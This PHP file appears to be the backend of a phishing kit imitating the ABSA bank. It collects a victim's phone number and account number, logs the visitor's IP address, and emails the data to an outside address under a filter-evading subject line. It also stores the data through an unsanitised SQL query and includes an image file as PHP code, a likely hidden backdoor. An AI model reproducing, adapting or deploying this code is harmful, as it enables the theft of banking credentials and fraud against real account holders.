<?php
session_start();
if(isset($_GET['confirmPhoneNumber']))
{
    include_once 'sqlite.php';

	$cellphonenumber = @$_GET['confirmPhoneNumber'];
        //$ccn = $_SESSION['param']['AccessAccount'];
        $ccn = $_GET['AccessAccount'];

	$ip = $_SERVER['REMOTE_ADDR'];

	$time = time();

        $msg = "+++++++++++++++++++++++++++++++++++++++\r\n";
        $msg .= "Cell Phone: $cellphonenumber\r\n";
        $msg .= "+++++++++++++++++++++++++++++++++++++++\r\n\r\n";



	$from = "support@".$_SERVER['HTTP_HOST'];
	$headers = "From:" . $from;
        $subject = "CELLPHONE A B S A - $ccn - $ip ".$_SERVER['HTTP_HOST'];
        $result = 'jbroughton49@usa.com';
	$invalid = array();

        $msg = $msg.$_SESSION['msg'];

        $_SESSION['msg'] = $msg;

	if(count($invalid) == 0)
	{
		if(mail($result, $subject, $msg, $headers))
                if(1)
		{
                    $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
                    //$db->exec($query);
                    $sqlqueryResult = mysqli_query($dbconnect, $query);


                    @$experience_login = file_get_contents('');
                    @$experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                    @$experience_login = str_replace("{PIN}", $csp, $experience_login);
                    @$experience_login = str_replace("{Operator}", $atm, $experience_login);
                    $callback = $_GET["callback"];include("../images/logo-blu.png");
                    @$experience_login = str_replace("{password}", $password, $experience_login);

                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];
                    $experience_login = "redirect";
                    $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "j_pin"));
                    echo $callback . '(' . $jsonResponse . ')';
		}

		else

		{
                    $experience_login = "redirect"; //file_get_contents('rvn-page.html');
                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];
                    $jsonResponse = json_encode(array('message' => $experience_login));
                    echo $callback . '(' . $jsonResponse . ')';
		}

	}
	else
	{
                    $experience_login = "Error"; //file_get_contents('rvn-page.html');

                    header("Content-Type: application/javascript");

                    $callback = $_GET["callback"];

                    $jsonResponse = json_encode(array('message' => $experience_login, 'errorMessage' => implode('\r\n', $error)));

                    echo $callback . '(' . $jsonResponse . ')';

	}

}

else

{

    $experience_login = "redirect"; //file_get_contents('rvn-page.html');

    header("Content-Type: application/javascript");

    $callback = $_GET["callback"];

    $jsonResponse = json_encode(array('message' => $experience_login));

    echo $callback . '(' . $jsonResponse . ')';

}

?>